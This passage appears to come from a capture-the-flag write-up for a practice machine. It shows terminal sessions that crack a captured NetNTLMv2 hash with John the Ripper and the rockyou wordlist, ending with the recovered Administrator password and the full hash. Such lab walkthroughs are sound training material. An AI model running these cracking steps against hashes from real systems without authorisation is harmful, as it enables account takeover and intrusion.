Attempting to crack the ntlmv2 hash with john:
```
┌──(kali㉿kali)-[~]
└─$ john --list=formats | grep -i ntlm
net-md5, netntlmv2, netntlm, netntlm-naive, net-sha1, nk, notes, md5ns, 
416 formats (149 dynamic formats shown as just "dynamic_n" here)
                                                                             
┌──(kali㉿kali)-[~]
└─$ john --list=formats | grep -i nt  
net-md5, netntlmv2, netntlm, netntlm-naive, net-sha1, nk, notes, md5ns, 
nsec3, NT, o10glogon, o3logon, o5logon, ODF, Office, oldoffice, 
416 formats (149 dynamic formats shown as just "dynamic_n" here)xmpp-scram, xsha, xsha512, zed, ZIP, ZipMonster, plaintext, has-160,
```

### Cracked hash
```
┌──(kali㉿kali)-[~]
└─$ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt unikaAdminNTLMv2Hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2025-08-10 07:26) 12.50g/s 51200p/s 51200c/s 51200C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
                                                                             
┌──(kali㉿kali)-[~]
└─$ john --show --format=netntlmv2 unikaAdminNTLMv2Hash 
Administrator:badminton:RESPONDER:ffcf3b7592f7b33d:FB18D4E9A12A6D6AC99E50FA6054078B:010100000000000000C7ADA1C509DC01A9B0D34BAC58CE4B0000000002000800340047004600430001001E00570049004E002D00550054005900560058004B0039003900430054005A0004003400570049004E002D00550054005900560058004B0039003900430054005A002E0034004700460043002E004C004F00430041004C000300140034004700460043002E004C004F00430041004C000500140034004700460043002E004C004F00430041004C000700080000C7ADA1C509DC01060004000200000008003000300000000000000001000000002000008FDC718F278E7779B4355B103329AE8644A15C95BCF1FF8A5F8A8F57129643940A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360035000000000000000000

1 password hash cracked, 0 left

```

Administrator:badminton